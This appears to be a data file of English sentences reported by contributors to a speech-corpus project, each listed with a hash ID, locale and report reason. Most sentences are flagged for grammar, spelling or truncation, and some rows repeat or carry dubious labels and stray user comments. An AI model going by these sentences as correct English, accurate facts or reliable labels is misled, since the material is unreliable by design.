sentence	sentence_id	locale	reason
She trained with three other girls under her school teacher Karunaratne and Fr.	3587b31520fd974d01fc24451d9feb847446993f4881d2f169af08dd8e6bb0b6	en	grammar-or-spelling
He was known as the younger to distinguish between his father.	35c3c80c56b3cda288e580016a1c7e520986470f3175eefbddf75254aa9ba4b5	en	grammar-or-spelling
Development of disadvantaged regions programs was started under Abdurrahman Wahid presidency.	3544de8abdd8ceb2d638d62d6b1e66d9f8ecdc77d436f7dbd035e9a88a992ee6	en	grammar-or-spelling
He leads the Compagnie Yoann Bourgeois touring dancing troupe.	35ea211e5251fd6441cdbfcd0fe5a2d0838ddf4b1d4db74b17dd9efc27669efb	en	difficult-pronounce
He was buried at in Berlin.	365d7f324abbbd882ebd48cbec281a5c5c7783c7056d9486267f9d61888f6b83	en	grammar-or-spelling
The Stone School is sometimes including on Historic tours of the area.	36528be89901839363eeae86631e3bbd79821798c302650adbc5877865c3481e	en	grammar-or-spelling
The reserve is located about to the west of the town.	37c6e60fca848736c856cc01fd0705a69c8e983ced917a52c32e5cefad1c06ff	en	grammar-or-spelling
The Miss Universe Philippines Organization designated focus of duties to each winners.	37dbeda7f01d47f4408096b598e0fa383bf9cc5b1bf560bded4fdcbbacfb857b	en	grammar-or-spelling
It displaces and carries of ballast in the steel centreboard.	37d896083a93f016b6885a55fd70fded8f45f5d2b5b9c7be7c62d293fca9721a	en	grammar-or-spelling
They were allegedly killed by Wu Zetian and their remains remains undiscovered.	37d5e18d9feb37c4f1ed1e2f9934eef9b546c5f338c8d55427b2c66c4b91876a	en	grammar-or-spelling
In collaboration with former world no.	34b7eb0a9e8482bbe956d162bc27e9e6467218ad5c9257f0b4ee80a9624d9a4c	en	grammar-or-spelling
The area came under Spanish rule ib what Spain claimed was New Spain.	379cf6c8386c91f48129427c33adb2425d251da0b729798e05b66f3a38e56284	en	grammar-or-spelling
Pte.	38c17d053b790b402e69be6f050015421e7b791253f2cdd3c18b50fb556b2750	en	grammar-or-spelling
All in Antwerp unless otherwise noted	38f43eed6209f44b9b04c656a82b8e2b22a3cf76a4c045312c859b9a4122bfbf	en	grammar-or-spelling
Some of this poems has been translated in English.	3901fa30a79f2a464d81f13c3f5ae6f87f8a98e83a89770dcbf9374bd7baf8ba	en	grammar-or-spelling
The main industries in and around the town is wood processing.	38eb575d28f93723c4864bf92423f9e3ccc344f1b730bfd16b10050895e44fff	en	grammar-or-spelling
One year later the entered again the promotion round as division winners.	37b57151c498fc74277bc9260ed9079ddbd095456c0c24fc7c83345ebb51292b	en	grammar-or-spelling
Only of the Indonesian population has been fully vaccinated.	3917d15e7aeb14fe634d848faf2851cebf2c1e9b81937763897188285903fc4c	en	grammar-or-spelling
The station is owned by.	38e29cd6c41ead47861bb9460242953337c7bee864a0147036e7a9ec3ac68d15	en	grammar-or-spelling
At first it is not clear whether they have successfully crossed the border.	39598ce3a5c22e9b0733063cabe897c54718644e4ea3652b8c979989e4d2c08f	en	offensive-language
At first it is not clear whether they have successfully crossed the border.	39598ce3a5c22e9b0733063cabe897c54718644e4ea3652b8c979989e4d2c08f	en	grammar-or-spelling
At first it is not clear whether they have successfully crossed the border.	39598ce3a5c22e9b0733063cabe897c54718644e4ea3652b8c979989e4d2c08f	en	different-language
At first it is not clear whether they have successfully crossed the border.	39598ce3a5c22e9b0733063cabe897c54718644e4ea3652b8c979989e4d2c08f	en	difficult-pronounce
It was also prominent on the Nottingham and District Trades Council.	394d5bafad0a8dfbf6b50fba633f6f6c1ade339a3b82e0d7d5f1a4974317c721	en	offensive-language
Both teams remained independent programs and will not be considered for conference championships.	3a6a59453918b3dc6b8759b05fba3a49c6bf24efdd91c88c6a8bf012a41da742	en	How the fuck do I turn this off
Other messuages and lands were given to them by John de Cobham.	3a15457ae1c187fcff33c1687e7c69e519df5d2b575a7b0dd3a2e4700d07bb74	en	grammar-or-spelling
They established by the initiative of the Government of Novosibirsk Oblast.	388d3535131bfb3cc060e5914055f348357af7fc3e153a2fb247f0dbaec3b5fa	en	grammar-or-spelling
She studied at and Sapienza University of Rome.	3a63836d6e1790da6d72509a1d58f2bf02596aa3e71d5b9d878ef13dad32955c	en	offensive-language
She studied at and Sapienza University of Rome.	3a63836d6e1790da6d72509a1d58f2bf02596aa3e71d5b9d878ef13dad32955c	en	grammar-or-spelling
She studied at and Sapienza University of Rome.	3a63836d6e1790da6d72509a1d58f2bf02596aa3e71d5b9d878ef13dad32955c	en	different-language
She studied at and Sapienza University of Rome.	3a63836d6e1790da6d72509a1d58f2bf02596aa3e71d5b9d878ef13dad32955c	en	difficult-pronunciation
She studied at and Sapienza University of Rome.	3a63836d6e1790da6d72509a1d58f2bf02596aa3e71d5b9d878ef13dad32955c	en	????
He was the eldest of their five children.	3a698c719c3a4b5216a11e4dfd34d03ce6e5a2313961be7179706e407c54004c	en	offensive-language
Under Early Caliphs buildings and Mosques were built.	3a060b8f4360f8002c950b4859f16f21966ddc79deed6f2cfab72d058c5d9e32	en	different-language
She belongs to business family.	3a68121678af941fdd6d435af963ccd7763faa82c25cb6481e5ae16f6c306ae4	en	different-language
To make oneself superfluous!	3a02601c35d333b681b3c5f4504fcdad3674f6ae3a118c6100419946211f2b02	en	different-language
Kerguelen met Poivre and Marion Dufresne.	3a35c7a6e8efc260ee8027ff26eb957201b400cbf9d8fbba93d539f41987abfa	en	different-language
Aerojet Rocketdyne was also participating in the project.	3a26d257710c2a660c78dad12487bbeddb4bc7aa2864ae0cc00a349f4904c59d	en	different-language
These worked for the run through Lodore Canyon at Dinosaur National Monument.	3a23c5603daacb04d374824c5b41e7fdbdc6686a182f420d0debc74159b89039	en	different-language
His office was subordinated directly to the Secretary of the Navy.	39bed4408f5a53ebc5d0028d132bc1311a515208d8e0f7ca7c6ebc2364bf8446	en	different-language
Abdul Muis soon joined as an editor as well.	3a792e6c333b35a0faa49d43c5748de8ecdec542f77eb6b6cd722410323ca909	en	different-language
This is obviously done separately for positive ideal solution and negative ideal solution.	3aa1857a6239f5d6ecc29bd5a79772ac3c50c3d05f3c0e3dde042c32c6a6291a	en	I'm here because I'd like to participate in the project called 'Aina' that Speaks Catalan
Its corporate office is located at Rm.	3a705fc53d1e971d482b4a6db95964b0fa0f139ac95f4b5b41196ed999eaf653	en	grammar-or-spelling
She also served one the Los Angeles County Music and Performing Arts Commission.	3adb4db56389718b6d0e18f29b69039679cb0eefe4a4fc1627d02f1d10e5c2d9	en	grammar-or-spelling
She landed some at St Vincent and the remainder at St Kitts.	3bc9e4cb844f4a0ee7f86de76b6d74bc5db9f3fb2f55cf5b17bddc6b5798e2c6	en	grammar-or-spelling
From its remains two regiments of (unmounted artillery) were formed.	3b31facfb5e9efdbb666a610c2e78c449fabf856219d34a47b5bdab78111d3d0	en	grammar-or-spelling
The leaves are arranged alternate with petioles (leaf stalks) distinct and short to elongated.	3c6d87b58b1517a80568030ea307847542e687e898f05b0937365bca723a4d39	en	grammar-or-spelling
She also write articles in several international and national newspapers.	3cdb8261e592e8617c7602363126e1774bbbbd8f8d368acaa452d6dd1daa01e2	en	grammar-or-spelling
His parents were Rev.	3b9e37fbf205fcc33af77f38092a78133a07876311d7bb6db2f398ab991f6e51	en	grammar-or-spelling
Duarte Barbosa ca.	3c6e01abb477bf346ab9989ab4a1eca8e2ef16b1b58065dae0962bc6eee8c4cf	en	grammar-or-spelling
It was your last words to me"".	3d5b1d286e9f0a20d46003afe1969fdd17fb20c07f8202f05ca4523d4b88e3e7	en	grammar-or-spelling
A vase of lowers is thus visible via the mirror on the left.	3c7acef2b8c0ba89b1cc28e31f0bc37939973259e5b8af635246df329589e101	en	grammar-or-spelling
Northern Region Football League	3da4ac75bf5d80748313964923d47bd2048397587f6171ec6724b23ba657c104	en	grammar-or-spelling
Northern Region Football League	3da4ac75bf5d80748313964923d47bd2048397587f6171ec6724b23ba657c104	en	.
They are currently members of the and play at the Len Forge Centre.	3ddefe8bd8910f3e6b7d1c92604063c5b139be2a41b3b7c96bf559adcbb66f96	en	grammar-or-spelling
She wanted to go up in the heaven despite her sins she committed.	3d8149f7e777e319996b81854ce8ad7fd16cdc9ae6154bb86b42d287fcbd39f2	en	grammar-or-spelling
They are currently members of the and play at the Len Forge Centre.	3ddefe8bd8910f3e6b7d1c92604063c5b139be2a41b3b7c96bf559adcbb66f96	en	grammar-or-spelling
They are currently members of the and play at the Len Forge Centre.	3ddefe8bd8910f3e6b7d1c92604063c5b139be2a41b3b7c96bf559adcbb66f96	en	grammar-or-spelling
Francis excelled and became the best in his class.	3f897a0dd57ca330b4a9d3e3de4bc81f1c51881bea080b06dec4446804f33cd9	en	different-language
Her parents were both doctors and it was expected that she would do to.	3f5680285554174b22729f864891a00a162cd004ee36db87db327387a7eea10a	en	grammar-or-spelling
There are about sixteen sites of historical significance are located near the trail.	3f57c415dc8a184397930898e1b9cf06535076de717a217a18dec7c3b8c43e96	en	grammar-or-spelling
This also can be made ahead of time and heated in microwave with drippings.	3f9062940f9aa7bfc20e45839955afba579ace5fe55a2b3489a9bf623177b31f	en	grammar-or-spelling
Solar Bandeira was one of many buildings own by Pedro Rodrigues Bandeira.	3f6458447d7b9a4adedd44deb017f85bbdf7d9922db7b1a0d47e897607a29e0e	en	grammar-or-spelling
He Studied computer science and technology baccalaureate from South India.	3f6fe3ad98d02db02f168d0f2362371296f89eecbaf3fdcd062efc6ef9bbb720	en	grammar-or-spelling
There is an organization called "The Friends of Azerbaijan" operates in South Africa.	3f35b742ba4ce23b98e4a6b051dec668483530dfb08eb471d7da951c3b082903	en	grammar-or-spelling
It is the first cookbook published to be written by an Oaxacan person.	3f58580193f36e5907ad6b9af5e380e5bcb47d33d440caa5b645209023a3e42f	en	grammar-or-spelling
Her holds included of refrigerated space.	400957216fd22907740e8e4ea8ef10b27598943a4b74dc8eab748a05f940eaac	en	grammar-or-spelling
Salamon studied mathematician at the Leibniz University Hannover.	3e504a3fbfde526d1b0d261e2d252da078cc681712a8ed76f444c097559048db	en	grammar-or-spelling
The film received critics acclaim and awarded in several local film festivals.	3fd3617d3baccd1f97694e1da41004571e4b3b62eaa286703d3a05069176188c	en	grammar-or-spelling
Finland entered one athletes into the Paralympic competition.	404ac0b39d58052f0ccfd4afedb095b52ee639bd52c41ec98420d79306db8a2d	en	grammar-or-spelling
She also sell Sampaguita lei that were made by her mother.	40665c8a3decf1c888ade0f4d83226c2407ec4ed80a191e2e73ccdd5ef1285fc	en	grammar-or-spelling
Flowering mainly occurs around August and the fruit is an elliptic capsule about long.	3fc9679593d4fa24536ca9f6c1d1612e7223feec3f1c6ac18119a4c905e996b8	en	grammar-or-spelling
With this Jews had gained the right to vote as full French citizen.	403509a697cfa3ce9e32b5cc7fd78e8038e97bf3ba1f8dcf59fc5809eeb630b9	en	grammar-or-spelling
She had Also one daughter from Husayn who was Fatimah.	407813c28c0e5bd5f32132d3c34e71bea1801cb03c4028efdf514e591267da00	en	grammar-or-spelling
Durga Lal Ji and Pt Birju Maharaj Ji.	3ff703e08934fe85479c9555c093a1277f5ccdbaf9c15c1e682e0bc74a023266	en	grammar-or-spelling
He starting with graphics and then focused on staged photography.	3ffa0e47a07b25acaf241397187bab8e826ed89a23647a9393a438ee5ecc6011	en	grammar-or-spelling
Salim bin Mohd.	4082055155153d4c720ec9b7720e866141828820d411ca43e1a66717e76be697	en	different-language
One of his main areas were also woodcuts.	3f9e57287ca7c73e5b9eab7f0ebd6c7375ef543f53f6bb03a2eec3742ea0e765	en	grammar-or-spelling
The City contains factory for oils and soaps.	403049f9f5c906d4c19331cd61ca5303b1665a07eae44223598be3543382f945	en	grammar-or-spelling
Zimmermann lives in Berlin.	40526c2b739f686901e17574789af69c3f039db8578590ec8ee42dd8e8c9b396	en	offensive-language
He also painted frescoes in the Residenz zu Athen.	40765922a83527e72352809b06944a08d331207e0043498012281843b1a214aa	en	grammar-or-spelling
That would her last journey to her country of birth.	416fe546538d4c1a69a38b4a6edd685ae2be368f22fe61ba11555d0288c7d445	en	grammar-or-spelling
They are currently members of the and play at Tinsley Lane in Crawley.	416cf160162b3042dd3da89f48e610dd12e85a03fb2c653c3c87359885a6b640	en	grammar-or-spelling
Engaged in disaster relief activities due to the eruption of Mt.	41b435270ffe8fd81dab464805bca4d750335bfc9cac2b22476913c5964bab4d	en	Sentence incorrectly cut off before its end due to the period in 'Mt.'.
Te surrounding area contains several other large tumuli from the same time period.	41d7ae18b16d67553ef271ab5fb74d943fe73d31b1750aea0a43edb7c6e67e18	en	grammar-or-spelling
The latest group of Assyrians immigrants come from Iraq and Syria.	400cda5b56f926812d41dd4b8de31480b18e4fbd8247f52ab186590ced9de2c7	en	grammar-or-spelling
There painting style was the typical Venetian influenced maniera greca in Crete.	41cf7d8663f87fc3eb547d80bb47a1d267bcb8003684bbc1d90b6799b220f537	en	grammar-or-spelling
His nominated was protested by Awami League supporters who described him as an "outsider".	41cf29546be7b2529fb33fedb19b55a627dc1bfd5213bfcb4be0280383e5150d	en	grammar-or-spelling
It is hosts the primary diplomatic mission from Ukraine to the Republic of Bulgaria.	40dadedfbd6ea1643be5ad35b48234738f7c1bf4fa2eaa21184a12f919e85fc5	en	grammar-or-spelling
In the same year company acquired Sabre Philippines Development Center.	42264ae79ec43c25b2fc188d6dcd9240a328fabf961ef5beef996d27f8f34f79	en	grammar-or-spelling
It was armed with eight cannon and six to eight swivel guns.	42076f0a660992acad34cafe63016f197c55ced52e8248e43e91ee97e53e4f9e	en	grammar-or-spelling
The dates of this festival depends on the Tibetan calender.	4171c258e1cc5b0783826490e907c9f35214df2a9a7fed1969f1f103af2dd5a9	en	grammar-or-spelling
Fr.	41be021fe423aeb9064c3e382b33492978a281ce6d3b5db616e40284998bd717	en	difficult-pronounce
Nagvanshi king Jagannath Shahdeo distanced himself from rebellion and supported British.	4276c045fe6f5d36c1108afa91188dce813b24309d2085de5ecb38db3240f9ae	en	grammar-or-spelling
Fifty perished from downing near the coast or being buried by debris.	42b7e1bff7c5cf1927e4383fe5d072f8ead6297f7db0f97886729f4d58849a32	en	grammar-or-spelling
Poor health forced him back to German but he returned and moved to Pennsylvania.	424e3632036622f12f5c257990cc4845016cb39bfc3d628758775123ac8bcf80	en	grammar-or-spelling
The program to establish the park was initiated by Land Reclamation and Development Cooperation.	42afcadff3406431f1119a51392ba08ccdfa6432f761ea5f927507357ca4e0e9	en	grammar-or-spelling
This kind of accounts named as "troll accounts" by some people.	42e70649d0975521a56f0a6f45208be8082fd2f8a39187ebf9ff3e4b5e26aea5	en	grammar-or-spelling
The population lives in the community are Thai and Thai Chinese.	42d5640bdd48288abfd09b56930609cb1aee92008010e23eb30934ef16978b7b	en	grammar-or-spelling
Elias married Jane Payn the daughter of Rev.	4270cfddf85600696f006712248fd7699a882b56e231d20e6aa490dce3efac1c	en	grammar-or-spelling
Nil Tara Pvt.	433e782e0b36d0c8efe4a3b7d3bd0070052c98a4f82f27ce4ea2da62be83273b	en	grammar-or-spelling
Ballyhale Shamrocks enetred the championship as the defending champions.	439398b7ca5454ee36477d5f693d9fa56b344abcaea1c7b648d349cbcc47c55c	en	grammar-or-spelling
Jur.	4409f71024898057dd092100ad2ff22436d5d45db67743fb25290bcd9421c457	en	grammar-or-spelling
Ballyhale Shamrocks enetred the championship as the defending champions.	439398b7ca5454ee36477d5f693d9fa56b344abcaea1c7b648d349cbcc47c55c	en	grammar-or-spelling
Ballyhale Shamrocks enetred the championship as the defending champions.	439398b7ca5454ee36477d5f693d9fa56b344abcaea1c7b648d349cbcc47c55c	en	grammar-or-spelling
Bowser publicly criticized Sherwin for not bringing enough charges against the protesters.	451968ea3db0079f80fb03a8c6bb213ad0333df4addfc1f381e1b650533e71e9	en	offensive-language
Most nominations	454fbef5009f58f9f8949ee72d69a76d0ce95663cc784eeab0fb155f1823f31e	en	.
Jur.	4409f71024898057dd092100ad2ff22436d5d45db67743fb25290bcd9421c457	en	grammar-or-spelling
Elite Messieurs	43266378f5f55561b49a77650bc2c3f34055d1ff368e3060622e4aa188f390ba	en	.
The inflorescences measure up to long and bear up to four yellow flowers.	45e4a1e9a02b1e8bef3b71cab9bb1438d6953196906fc6cbb50a6e5cee78f4fc	en	grammar-or-spelling
Services to and Ellenbrook will be provided by Transperth Trains.	462a7f5494eb9378b2f18cf155212e2f125bebef8591652116969442af6fb5d6	en	grammar-or-spelling
It was the first protest in Pan American Games history.	4575714d8e8c90a64cf3a00228e0f7521c971fba9cfa37e1fcded251efc321b7	en	Not detecting my voice someone else is  controlling 
Ballyhale Shamrocks enetred the championship as the defending champions.	439398b7ca5454ee36477d5f693d9fa56b344abcaea1c7b648d349cbcc47c55c	en	grammar-or-spelling
He was one of six Bucknell player to be honored.	463d7cabef5fd5ead4466cf199105f857558c5cc0ef55f5074d58c0541bd4f3f	en	grammar-or-spelling
Today only two volumes survive complete plus fragments of three others.	45ecf72e35ff02babd336612f60a2c32ef0d35c2c419884dd878e9d37326d9c7	en	grammar-or-spelling
She went their for watching the shooting of the film.	45451d32f2e27667ae60c4846fe66f4ed0b9d6fb37bb0191eb4f78d7de6745bf	en	grammar-or-spelling
The album was reissued the following year by Fifth Colvmn Records in April.	45e0cb774d824f6199f4f09ea808472e26377a12435d1f548839306489d14c37	en	grammar-or-spelling
The five sepals are long with triangular lobes about long.	46698447c0da36621acc02ebc429e5db29aeb2358fc7b116f09e93f5f25a715e	en	grammar-or-spelling
Abdi Bangsa Tbk.	46d0e02a080019c1677cfe79999ea6e77f2e2294015b07c31058ddc55c407a9a	en	difficult-pronounce
Its main sponsors were Esso and Mobil.	473473393f0d015d8f35c33fdb98d04c3483892bab262da02e54e199ac1f23f5	en	grammar-or-spelling
